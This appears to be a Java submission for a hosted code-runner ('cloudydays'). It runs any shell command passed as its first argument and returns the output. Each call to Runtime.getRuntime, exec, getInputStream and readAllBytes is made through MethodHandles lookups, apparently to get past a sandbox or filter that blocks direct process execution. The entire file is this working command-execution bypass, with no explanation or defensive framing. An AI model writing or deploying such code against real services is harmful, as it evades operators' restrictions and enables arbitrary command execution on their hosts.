import lebedev.cloudydays.api.Storage;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.nio.charset.StandardCharsets;

public class Main {
    private static Storage storage;

    public static String main(String[] args, Storage storage) {
        Main.storage = storage;

        try {
            Runtime r = getRuntime();
            Process p = exec(r, args[0]);
            InputStream is = getInputStream(p);
            return new String(readAll(is));
        } catch (Throwable e) {
            return e.getMessage();
        }
    }

    public static Runtime getRuntime() throws Throwable {
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodType mt = MethodType.methodType(Runtime.class);
        MethodHandle mh = lookup.findStatic(Runtime.class, "getRuntime", mt);
        return (Runtime) mh.invokeExact();
    }

    public static Process exec(Runtime runtime, String command) throws Throwable {
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodHandle mh = lookup.findVirtual(Runtime.class, "exec", MethodType.methodType(Process.class, String.class));
        return (Process) mh.invokeExact(runtime, command);
    }

    public static InputStream getInputStream(Process process) throws Throwable {
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodHandle mh = lookup.findVirtual(Process.class, "getInputStream", MethodType.methodType(InputStream.class));
        return (InputStream) mh.invokeExact(process);
    }

    public static byte[] readAll(InputStream is) throws Throwable {
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodHandle mh = lookup.findVirtual(InputStream.class, "readAllBytes", MethodType.methodType(byte[].class));
        return (byte[]) mh.invokeExact(is);
    }
}
